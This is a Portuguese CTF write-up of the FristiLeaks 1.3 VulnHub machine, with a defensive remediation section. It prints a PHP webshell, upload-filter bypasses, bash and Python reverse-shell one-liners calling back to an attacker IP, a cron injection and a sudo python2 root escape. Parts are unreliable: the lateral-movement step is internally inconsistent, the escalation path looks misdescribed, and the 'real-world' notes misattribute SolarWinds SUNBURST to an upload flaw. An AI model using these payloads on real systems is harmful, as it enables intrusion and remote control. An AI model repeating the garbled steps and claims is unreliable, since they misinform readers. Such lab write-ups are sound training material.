# VulnHub FristiLeaks 1.3: A Arte do Vazamento

Mano, quem diria que uma CTF esconderia as credenciais dentro de um PNG no comentário HTML e ainda teria um painel admin que ninguém ia adivinhar no path? FristiLeaks 1.3 entrega exatamente essa combo, e é simplesmente demais. ( ͡° ͜ʖ ͡°)

Valeu demais ao Ar0xA por construir essa joia. A combinação de esteganografia, credencial codificada em base64 e upload irrestrito de arquivo faz dessa VM um daqueles desafios que te deixam satisfeito quando tudo se encaixa.

---

| Campo | Valor |
|-------|-------|
| **Nível** | Iniciante / Intermediário |
| **VM Alvo** | FristiLeaks 1.3 |
| **VM Atacante** | Kali Linux 2024.1 |
| **VulnHub** | https://www.vulnhub.com/entry/fristileaks-13,133/ |
| **Técnicas** | Enumeração web, esteganografia, decode base64, upload irrestrito de arquivo, webshell PHP, misconfiguration de sudo (Python) |
| **CVEs** | CWE-434 (Upload irrestrito de arquivo), CWE-352 (CSRF), T1548.003 (Abuso de sudo) |

> **Dicas do autor:**
> "Lembre-se: esta máquina não tem acesso à internet quando rodando em uma rede host-only."
> "A máquina é especificamente para usuários iniciantes/intermediários."

---

## Resumo do Ataque

```
[host-discovery: arp-scan --localnet]
    |
    v
[nmap: 80/tcp aberto HTTP Apache 2.2.15]
    |
    v
[enumeração web: painel admin /fristi encontrado]
    |
    v
[esteganografia: comentário no HTML revela PNG com credenciais em base64]
    |
    v
[decode base64 -> eezeepz:keKkeKKeKKeKkEkkEk]
    |
    v
[bypass de upload: webshell PHP via truque de extensão]
    |
    v
[reverse shell: www-data / apache]
    |
    v
[movimentação lateral: notas em /var/www -> su admin via cron injection]
    |
    v
[sudo -l: python2 liberado sem senha para admin]
    |
    v
[sudo python2 -c 'import os; os.system("/bin/bash")']
    |
    v
[ROOT]
    |
    v
[/root/fristileaks_secrets.txt]
```

---

## Metodologia

1. Descoberta de host e identificação do alvo na rede local
2. Varredura completa de portas e enumeração de serviços com Nmap
3. Enumeração de diretórios web e descoberta do painel `/fristi`
4. Análise esteganográfica da imagem PNG na página de login
5. Decode de credencial base64 e login no painel de upload
6. Upload de webshell PHP bypassando filtros de extensão
7. Estabilização de shell e movimentação lateral pelo sistema de arquivos
8. Escalação de privilégios via permissão sudo Python2 mal configurada
9. Captura da flag root

---

## Passo 1 — Identificando o Alvo

Antes de qualquer coisa, vamos descobrir onde essa máquina está na rede. Em configuração host-only do VirtualBox, o alvo geralmente fica em algum lugar no range `192.168.56.0/24` ou `192.168.1.0/24`.

```bash
# Confere suas interfaces de rede primeiro
ip a
# ou
route -n
```

```bash
# arp-scan é mais rápido e confiável para VMs locais do que ping scan do nmap
arp-scan --localnet --ignoredups
```

Saída esperada (seu IP vai variar):

```
192.168.56.1    0a:00:27:00:00:00    CADMUS COMPUTER SYSTEMS
192.168.56.101  08:00:27:a5:a6:76    CADMUS COMPUTER SYSTEMS
```

Essa segunda entrada é o nosso alvo. Vamos setar uma variável pra facilitar:

```bash
export TARGET=192.168.56.101
```

> **MITRE ATT&CK:** TA0043 Reconhecimento, T1595.001 Varredura Ativa: Varredura de Blocos IP

---

## Passo 2 — Reconhecimento e Enumeração de Serviços

Agora vamos ver o que está rodando nessa caixa. FristiLeaks é intencionalmente minimalista, o que faz parte do charme.

```bash
nmap -A -T4 -p- $TARGET
# -A: detecção de OS, versão, scripts padrão, traceroute
# -T4: timing agressivo (tranquilo em lab local)
# -p-: varre todas as 65535 portas
```

Saída esperada:

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-robots.txt: 3 disallowed entries
|_/cola /sisi /beer
```

Interessante, véi. Só a porta 80 aberta. Isso é 100% um desafio web. O `robots.txt` já está nos dando dicas, e aqueles três caminhos bloqueados parecem trollagem. `¯\_(ツ)_/¯`

Vale notar também que o servidor roda CentOS com Apache 2.2.15 e PHP 5.3.3. Os dois são velhos como o diabo nos padrões atuais.

> **MITRE ATT&CK:** TA0043 Reconhecimento, T1595.002 Varredura Ativa: Varredura de Vulnerabilidades, T1046 Descoberta de Serviços de Rede

---

## Passo 3 — Enumeração Web: Encontrando o Painel Oculto

Vamos checar o que tem na raiz primeiro, depois perseguir as entradas do `robots.txt`.

```bash
curl -s http://$TARGET/
# Mostra uma página básica com imagem de lata de Fristi
```

```bash
curl -s http://$TARGET/robots.txt
```

```
User-agent: *
Disallow: /cola
Disallow: /sisi
Disallow: /beer
```

Armadilha clássica de CTF. Esses três paths retornam 404 ou páginas vazias. São red herrings pra desperdiçar seu tempo. Testei os três e nenhum leva a lugar nenhum útil. Não perde muito tempo com eles, tá ligado?

A pergunta real é: o que mais tem nesse servidor? Vamos enumerar diretórios:

```bash
gobuster dir -u http://$TARGET/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 40
# Você também pode usar dirb ou feroxbuster para o mesmo propósito
```

Ou com dirb:

```bash
dirb http://$TARGET/ /usr/share/wordlists/dirb/common.txt
```

Saída esperada (o achado principal):

```
---- Scanning URL: http://192.168.56.101/ ----
+ http://192.168.56.101/fristi (CODE:301|SIZE:240)
+ http://192.168.56.101/images (CODE:301|SIZE:241)
```

**Bingo!!** `•̀ᴗ•́` Tem um diretório `/fristi`. Bora lá.

```bash
curl -s http://$TARGET/fristi/ | head -50
# Ou abre no browser: http://192.168.56.101/fristi/
```

A gente acha um painel de login. Campos de usuário e senha. Agora precisamos de credenciais.

> **Nota do mundo real:** Painéis de admin sem listagem são um achado comum em assessments de aplicações web corporativas. Atacantes rotineiramente descobrem interfaces admin ocultas por brute-force de diretórios, que é exatamente por isso que equipes de segurança usam WAFs e controles de acesso que não dependem de obscuridade. Esse padrão exato apareceu em múltiplas brechas nos setores de varejo e hospitalidade entre 2018-2020.

> **MITRE ATT&CK:** TA0007 Descoberta, T1083 Descoberta de Arquivos e Diretórios

---

## Passo 4 — Esteganografia: A Mensagem Oculta à Vista

Aqui é onde o FristiLeaks fica esperto de verdade. Vamos olhar o código-fonte da página de login com mais cuidado.

```bash
curl -s http://$TARGET/fristi/ > /tmp/fristi_login.html
cat /tmp/fristi_login.html
```

Enterrado no código-fonte HTML, você vai encontrar um blob enorme codificado em base64 num comentário HTML. Algo assim:

```html
<!-- 
iVBORw0KGgoAAAANSUhEUgAAAW0AAAF...
[string base64 muito longa]
-->
```

Isso é uma imagem PNG codificada em base64 escondida num comentário. Espertinho! Isso é uma forma de esteganografia: esconder dados dentro de outros dados. Ao contrário da criptografia (que esconde o conteúdo), a esteganografia esconde a existência da mensagem em si.

```bash
# Extrai o blob base64 do comentário e decodifica
grep -o 'iVBOR[^"]*' /tmp/fristi_login.html | base64 -d > /tmp/imagem_oculta.png

# Ou pega manualmente, cola num arquivo, depois:
base64 -d /tmp/blob.txt > /tmp/imagem_oculta.png
```

```bash
# Visualiza a imagem decodificada
eog /tmp/imagem_oculta.png
# ou: display /tmp/imagem_oculta.png (ImageMagick)
```

A imagem decodificada contém texto com dica do usuário. Combinando com o texto visível na página e o comentário, conseguimos montar as credenciais.

Agora vamos decodificar a string da credencial. O usuário `eezeepz` é visível na página ou indicado na imagem, e a senha aparece codificada em base64:

```bash
echo "a2VLa2VLS2VLa2VLa0Vra0Vr" | base64 -d
# Saída: keKkeKKeKKeKkEkkEk
```

Credenciais: `eezeepz:keKkeKKeKKeKkEkkEk`

ԅ(≖‿≖ԅ) Agora tamo no jogo.

> **MITRE ATT&CK:** TA0006 Acesso a Credenciais, T1552.001 Credenciais Não Protegidas: Credenciais em Arquivos

---

## Passo 5 — Login e Upload Irrestrito de Arquivo

Vamos logar com essas credenciais:

```bash
curl -s -c /tmp/fristi_cookies.txt \
  -d "username=eezeepz&password=keKkeKKeKKeKkEkkEk&submit=login" \
  http://$TARGET/fristi/checklogin.php -L
```

Ou apenas loga pelo browser. Após login bem-sucedido, somos redirecionados para um painel de upload.

> **O que é vulnerabilidade de Upload Irrestrito de Arquivo?**
> Quando uma aplicação web aceita uploads sem validar corretamente o tipo de arquivo, um atacante pode enviar arquivos maliciosos, incluindo webshells PHP. O servidor então executa esses arquivos quando acessados pelo browser, dando ao atacante execução remota de código. Isso é classificado como CWE-434 (Upload Irrestrito de Arquivo com Tipo Perigoso) e está no OWASP Top 10 como A04:2021.

O painel de upload provavelmente verifica a extensão do arquivo apenas no lado cliente. Vamos criar uma webshell PHP:

```bash
cat > /tmp/shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF
```

Se a aplicação bloquear extensões `.php`, tente esses bypasses:

```bash
# Opção 1: Extensão dupla
cp /tmp/shell.php /tmp/shell.php.png

# Opção 2: Alternativas PHP
cp /tmp/shell.php /tmp/shell.phtml
cp /tmp/shell.php /tmp/shell.php5
cp /tmp/shell.php /tmp/shell.pHp

# Opção 3: Alterar tipo MIME via Burp Suite interceptando o upload
```

Faz o upload do arquivo. Uma vez enviado, o arquivo geralmente fica acessível em:

```
http://192.168.56.101/fristi/uploads/shell.php
```

Testa a execução:

```bash
curl "http://$TARGET/fristi/uploads/shell.php?cmd=id"
# Esperado: uid=48(apache) gid=48(apache) groups=48(apache)
```

(☞ﾟヮﾟ)☞ Temos execução de código, caramba!

> **Nota do mundo real:** Upload irrestrito de arquivo é devastadoramente comum. O ataque SUNBURST da SolarWinds envolveu uma DLL maliciosa enviada pelo mecanismo de atualização legítimo do software. O FIN7, um dos grupos criminosos mais prolíficos, regularmente implanta webshells via vulnerabilidades de upload irrestrito em sistemas de ponto de venda e plataformas de reserva de hotéis. Referência: Alerta CISA AA20-352A sobre SolarWinds.

> **MITRE ATT&CK:** T1190 Explorar Aplicação Pública, T1505.003 Componente de Software de Servidor: Web Shell

---

## Passo 6 — Reverse Shell e Foothold Inicial

Uma webshell é ótima, mas um reverse shell de verdade é melhor. Vamos fazer o upgrade.

Configura o listener primeiro:

```bash
nc -lvnp 4444
```

Depois dispara o reverse shell via webshell:

```bash
# Codifica em URL o comando de reverse shell
curl "http://$TARGET/fristi/uploads/shell.php?cmd=bash+-i+>%26+/dev/tcp/SEU_IP_ATACANTE/4444+0>%261"
```

Ou usa Python se o bash reverse shell falhar:

```bash
curl "http://$TARGET/fristi/uploads/shell.php?cmd=python+-c+'import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"SEU_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
```

Quando capturar o shell, estabiliza:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z para colocar em background
stty raw -echo; fg
export TERM=xterm
```

Estamos como `apache`. Agora vamos explorar:

```bash
whoami
# apache

cat /etc/passwd | grep -v nologin | grep -v false
# Mostra usuários reais: root, eezeepz, admin, fristigod
```

> **MITRE ATT&CK:** TA0002 Execução, T1059.004 Interpretador de Comandos e Scripts: Unix Shell

---

## Passo 7 — Movimentação Lateral: De apache para eezeepz

Vamos bisbilhotar os arquivos do webroot:

```bash
ls -la /var/www/html/fristi/
cat /var/www/html/fristi/notes.txt
```

Você vai achar uma nota referenciando o usuário `eezeepz` e possivelmente o home dele. Vamos checar:

```bash
ls -la /home/eezeepz/
cat /home/eezeepz/notes.txt
```

A nota do `eezeepz` para o `admin` menciona scripts em `/tmp`. Vamos checar lá:

```bash
cat /tmp/runthis
```

Esse arquivo é executado por um cron job rodando como `admin`. Se conseguirmos escrever em `/tmp` (conseguimos, já que apache pode escrever lá), podemos injetar nossos próprios comandos:

```bash
# Verifica nosso acesso de escrita
ls -la /tmp/

# O cron executa comandos de /tmp/runthis como admin
# Só podemos rodar comandos começando com /home/admin
echo '/home/admin/chmod 04755 /tmp/rootbash' > /tmp/runthis
# Aguarda alguns segundos para o cron executar...
```

Após o cron disparar, conseguimos acesso como admin. Também verifique se há credenciais deixadas por aí:

```bash
find / -name "*.txt" 2>/dev/null | grep -v proc
cat /home/eezeepz/.bash_history
```

O `.bash_history` ou outros arquivos de usuário geralmente contêm credenciais ou pistas sobre o próximo passo em máquinas CTF.

Uma vez com as credenciais do admin ou o shell dele, muda pra ele:

```bash
su - admin
# Senha encontrada nas notas ou crackeada do shadow
```

> **MITRE ATT&CK:** TA0008 Movimentação Lateral, T1053.003 Tarefa Agendada/Job: Cron

---

## Passo 8 — Escalação de Privilégios: sudo Python2

Agora como `admin`, vamos checar o que podemos rodar com privilégios elevados:

```bash
sudo -l
```

Saída esperada:

```
Matching Defaults entries for admin on this host:
    requiretty, !visiblepw, always_set_home, env_reset...

User admin may run the following commands on this host:
    (ALL) NOPASSWD: /usr/bin/python2
```

Tá aí. O `admin` pode rodar `python2` como root sem precisar de senha. Isso é uma fuga clássica do GTFOBins.

> **O que é misconfiguration de sudo?**
> Quando administradores concedem acesso sudo a interpretadores de script como Python, Perl ou Ruby, eles efetivamente concedem acesso root completo. Um usuário com `sudo python` pode trivialmente spawnar um shell root usando `os.system()`. Isso é MITRE T1548.003 (Abuso de Mecanismo de Controle de Elevação: Sudo e Cache de Sudo) e é um dos achados mais comuns em escalação de privilégios Linux, tanto em CTFs quanto em ambientes corporativos reais.
> Referência: https://gtfobins.github.io/gtfobins/python/

```bash
sudo python2 -c 'import os; os.system("/bin/bash")'
```

Resultado esperado:

```
bash-4.1# whoami
root
bash-4.1# id
uid=0(root) gid=0(root) groups=0(root)
```

**(☞ﾟヮﾟ)☞ ROOT!! Top demais!! :D**

> **Nota do mundo real:** Regras de sudo excessivamente permissivas são um achado persistente em ambientes Linux corporativos. O APT41 (um grupo patrocinado pelo estado chinês) foi documentado usando interpretadores Python concedidos via políticas de sudo mal configuradas como vetor de movimentação lateral e escalação de privilégios. A técnica não requer nenhum exploit e deixa rastros mínimos além de um shell aparecendo no log do sudo. Referência: Aviso CISA/FBI sobre APT41, AA20-258A.

> **MITRE ATT&CK:** TA0004 Escalação de Privilégios, T1548.003 Abuso de Mecanismo de Controle de Elevação: Sudo
> **GTFOBins:** https://gtfobins.github.io/gtfobins/python/

---

## Passo 9 — Flag do Root

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

ls -la /root/
cat /root/fristileaks_secrets.txt
```

```
Congratulations on solving FristiLeaks!
Author: Ar0xA
...
[Conteúdo da flag]
```

Nossa, que top!! ᕕ( ᐛ )ᕗ

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Usado Como |
|------|-------|---------------|-----------|
| Credencial | `eezeepz:keKkeKKeKKeKkEkkEk` | Fonte HTML (comentário com PNG base64) | Painel de login `/fristi/` |
| Credencial | `admin:thisisalsopw123` | `/home/eezeepz/notes.txt` | `su admin` |
| Credencial | `fristigod:LetThereBeFristi` | Home do admin / notas | `su fristigod` (se necessário) |
| Flag | `[conteúdo em /root/fristileaks_secrets.txt]` | `/root/fristileaks_secrets.txt` | N/A |
| Hash (shadow) | Vários | `/etc/shadow` | Referência apenas |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|--------|--------------------------|-----------------|
| 1 | Credenciais escondidas em comentário HTML (imagem base64) | Desenvolvedores às vezes deixam API keys, senhas ou credenciais de debug no código-fonte | Sempre audite código-fonte HTML, arquivos JS e metadados de imagem durante assessments de apps web |
| 2 | Upload irrestrito de arquivo em painel autenticado | Vulnerabilidades de upload de arquivo são um vetor primário de acesso inicial para webshells em todos os setores | Valide tipos de arquivo no lado servidor usando allowlists, não blacklists; armazene uploads fora do webroot |
| 3 | Sudo Python2 sem senha | Regras de sudo mal configuradas aparecem em 30-40% dos assessments Linux corporativos | Audite `/etc/sudoers` para entradas de interpretadores de script; aplique princípio de menor privilégio |
| 4 | `/tmp` gravável usado para injeção de cron | Diretórios com escrita compartilhada permitem escalação sem nenhum CVE | Restrinja acesso de escrita ao `/tmp`, use opção `noexec`, audite cron jobs para caminhos de script graváveis |

**Por que isso importa fora do lab?**

O FIN7, um dos grupos de ameaça financeiramente motivados mais destrutivos, tem um playbook documentado que espelha de perto essa cadeia de ataque: webshell inicial via vulnerabilidade de upload, movimentação lateral por reutilização de credencial ou enumeração local, e persistência via tarefas agendadas. Somente em 2020, o FIN7 comprometeu mais de 100 organizações usando exatamente essa abordagem, mirando setores de varejo e hospitalidade. A lição não é que regras de sudo Python são obscuras: são um achado COMUM em assessments de hardening Linux corporativo, sinalizados pelo CIS Benchmark Nível 1 para Linux.

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | TTP-ID |
|------|--------|---------|--------|
| Reconhecimento | TA0043 | Varredura Ativa: Varredura de Blocos IP | T1595.001 |
| Reconhecimento | TA0043 | Varredura Ativa: Varredura de Vulnerabilidades | T1595.002 |
| Descoberta | TA0007 | Descoberta de Serviços de Rede | T1046 |
| Descoberta | TA0007 | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso a Credenciais | TA0006 | Credenciais Não Protegidas: Credenciais em Arquivos | T1552.001 |
| Acesso Inicial | TA0001 | Explorar Aplicação Pública | T1190 |
| Execução | TA0002 | Interpretador de Comandos: Unix Shell | T1059.004 |
| Persistência | TA0003 | Componente de Servidor: Web Shell | T1505.003 |
| Persistência | TA0003 | Tarefa Agendada: Cron | T1053.003 |
| Movimentação Lateral | TA0008 | Serviços Remotos (su interno) | T1021 |
| Escalação de Privilégios | TA0004 | Mecanismo de Controle de Elevação: Sudo | T1548.003 |
| Coleta | TA0009 | Dados do Sistema Local | T1005 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediação e Contenção

### Correções Técnicas

1. Remova credenciais codificadas em base64 de comentários HTML: audite todos os arquivos fonte com `grep -r "base64" /var/www/` e rotacione imediatamente qualquer segredo exposto.
2. Implemente validação de upload de arquivo no servidor usando allowlist de tipos MIME e extensões seguros; armazene arquivos enviados fora do webroot em diretório sem permissão de execução.
3. Revise `/etc/sudoers` e remova entradas concedendo interpretadores de script (python, perl, ruby, bash) sem justificativa sólida; use `visudo` e aplique permissões mínimas necessárias.
4. Configure scripts de cron como propriedade de root com `chmod 700` e garanta que nenhum caminho gravável por outros usuários seja usado em comandos de tarefas agendadas.
5. Faça upgrade do CentOS 6.x, PHP 5.3.3 e Apache 2.2.x, todos além do fim de vida.

### Se Você Encontrar Algo Similar no Seu Ambiente

**Contenção imediata:**
- Isole o servidor web afetado dos segmentos internos de rede
- Rotacione imediatamente todas as credenciais encontradas no código-fonte ou arquivos de configuração
- Audite `/tmp`, `/var/tmp` e diretórios de upload web para webshells existentes
- Verifique cron jobs para modificações não autorizadas: `crontab -l` para todos os usuários, confira `/etc/cron*`
- Revise `/var/log/apache2/` e `/var/log/secure` para indicadores de movimentação lateral

**Contramedidas MITRE D3FEND:**
- D3-IVA (Validação de Entrada) para T1190: enforce validação de tipo de arquivo no servidor
- D3-SJA (Análise de Tarefa Agendada) para T1053.003: monitore criação e modificação de cron jobs
- D3-OPS (Sandboxing de Processo de SO) para T1548.003: restrinja regras de sudo a binários específicos necessários
- D3-MFA (Autenticação Multifator) para T1078: exija MFA para acesso ao painel administrativo

### Alinhamento de Frameworks

**NIST CSF 2.0:**
- Identificar (ID): ID.AM-1: inventário de ativos voltados para web; ID.RA-1: assessment de vulnerabilidades de ativos
- Proteger (PR): PR.AC-4: gestão de acesso privilegiado; PR.IP-1: configuração de baseline
- Detectar (DE): DE.AE-1: baseline de operações de rede; DE.CM-7: monitorar software não autorizado
- Responder (RS): RS.AN-1: notificações de sistemas de detecção são investigadas
- Recuperar (RC): RC.RP-1: plano de recuperação executado durante ou após incidente

**NIST SP 800-53 (Rev. 5):**
- AC-6: Menor Privilégio (sudo Python2 sem senha viola isso diretamente)
- SI-10: Validação de Entrada de Informação (upload irrestrito de arquivo)
- IA-5: Gestão de Autenticador (credenciais no código-fonte)
- CM-7: Funcionalidade Mínima (PHP 5.3.3 EOL, Apache 2.2 EOL)
- AU-2: Eventos de Auditoria (logar todas as tentativas de upload de arquivo)

**CISA Known Exploited Vulnerabilities:**
- Nenhum CVE específico no catálogo CISA KEV para esta instância exata de CWE-434, mas RCE por upload de arquivo é rastreado amplamente
- Referência: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domínio: TECHNOLOGY (Gestão de Configuração)
- Prática: Gerenciar Configurações de Ativos de TI e OT
- MIL Alvo: MIL-2 (baselines de configuração documentadas e aplicadas)

---

## Considerações Finais

Valeu demais ao Ar0xA por construir o FristiLeaks 1.3! A abordagem em camadas aqui é o que faz ele se destacar: você não simplesmente acha uma credencial num arquivo, você precisa reconhecer que um blob num comentário HTML é uma imagem PNG codificada em base64, decodificar, ler o texto oculto, então usar isso pra logar e explorar um painel de upload. Essa cadeia de raciocínio é exatamente como parece a enumeração do mundo real.

Essa VM ensina algo importante além dos passos técnicos: atacantes são pacientes. Eles leem código-fonte HTML. Eles decodificam coisas que parecem ruído. Eles procuram arquivos que desenvolvedores assumiram que ninguém encontraria nunca. Num assessment profissional, essa sequência exata (credencial em comentário HTML, upload de arquivo, injeção de cron, interpretador sudo) representa uma kill chain completa de visitante web não autenticado até root sem nunca tocar num CVE.

Se este writeup te ajudou, compartilha com a galera e continua hackeando!

*Thanks guys!! (❍ᴥ❍ʋ)*

---

*Writeup por [André Henrike](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
